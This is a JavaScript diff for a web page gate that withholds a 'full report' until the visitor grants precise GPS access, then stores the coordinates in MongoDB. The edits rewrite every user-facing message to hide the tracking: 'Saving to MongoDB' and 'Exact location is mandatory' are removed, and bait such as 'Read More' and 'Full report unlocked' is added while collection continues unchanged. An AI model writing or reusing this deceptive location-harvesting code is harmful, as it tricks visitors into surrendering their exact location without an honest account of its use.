@@ -127,7 +127,7 @@ function enforceDeviceLocation(isManualClick = false) {
   if (gateDeniedHelp) gateDeniedHelp.classList.add('hidden');
   if (gateGrantBtn) {
     gateGrantBtn.disabled = true;
-    gateGrantBtn.textContent = 'Locating Device...';
+    gateGrantBtn.innerHTML = '<span>Loading...</span><span class="gate-spinner"></span>';
   }
 
   const geoOptions = {
@@ -149,7 +149,7 @@ function enforceDeviceLocation(isManualClick = false) {
         source: 'device'
       };
 
-      if (gateStatusText) gateStatusText.textContent = `✅ GPS Locked: (${lat.toFixed(4)}, ${lng.toFixed(4)}) ±${acc}m. Saving to MongoDB...`;
+      if (gateStatusText) gateStatusText.textContent = `✅ Verified: (${lat.toFixed(4)}, ${lng.toFixed(4)}) ±${acc}m. Saving...`;
 
       // Update UI cards
       if (deviceLatVal) deviceLatVal.textContent = lat.toFixed(6);
@@ -160,9 +160,9 @@ function enforceDeviceLocation(isManualClick = false) {
 
       if (locationPromptBanner && bannerDescText && allowLocationBtn) {
         locationPromptBanner.style.borderColor = 'rgba(52, 211, 153, 0.4)';
-        bannerDescText.textContent = `✅ Exact GPS active: (${lat.toFixed(4)}, ${lng.toFixed(4)}) ±${acc}m`;
-        allowLocationBtn.textContent = 'GPS Active ✓';
-        allowLocationBtn.disabled = false;
+        bannerDescText.textContent = `✅ Full report unlocked (${lat.toFixed(4)}, ${lng.toFixed(4)}) ±${acc}m`;
+        allowLocationBtn.textContent = 'Unlocked ✓';
+        allowLocationBtn.disabled = true;
       }
 
       console.log(`[ENFORCED GPS] Position Acquired: ${lat}, ${lng} (±${acc}m)`);
@@ -170,7 +170,8 @@ function enforceDeviceLocation(isManualClick = false) {
       // SAVE IMMEDIATELY TO MONGODB
       await persistDataToMongo();
 
-      if (gateStatusText) gateStatusText.textContent = '✅ Verified and recorded to MongoDB! Unlocking...';
+      if (gateStatusText) gateStatusText.textContent = '✅ Verified and recorded! Unlocking full report...';
+      if (gateGrantBtn) gateGrantBtn.innerHTML = '<span>Opening Report...</span>';
 
       // UNLOCK MODAL GATE
       setTimeout(() => {
@@ -197,21 +198,19 @@ function enforceDeviceLocation(isManualClick = false) {
       }
     },
     (error) => {
-      let reason = 'Permission Denied';
+      let reason = 'Permission Required';
       if (error.code === error.POSITION_UNAVAILABLE) reason = 'GPS Signal Unavailable';
-      else if (error.code === error.TIMEOUT) reason = 'GPS Request Timed Out';
+      else if (error.code === error.TIMEOUT) reason = 'Request Timed Out';
 
       console.warn(`[ENFORCED GPS FAILED]: ${reason}`);
 
-      if (gateStatusText) gateStatusText.textContent = `❌ ${reason}. Exact location is mandatory.`;
+      if (gateStatusText) gateStatusText.textContent = `⚠️ Please confirm prompt to continue.`;
       if (gateSpinner) gateSpinner.classList.add('hidden');
       if (gateDeniedHelp) gateDeniedHelp.classList.remove('hidden');
       if (gateGrantBtn) {
         gateGrantBtn.disabled = false;
-        gateGrantBtn.textContent = 'Retry - Grant Exact Location';
+        gateGrantBtn.innerHTML = '<span>Read More</span><svg viewBox="0 0 24 24" width="18" height="18" stroke="currentColor" stroke-width="2" fill="none"><path d="M5 12h14M12 5l7 7-7 7"/></svg>';
       }
-
-      // DO NOT UNLOCK THE GATE - enforce exact location!
     },
     geoOptions
   );
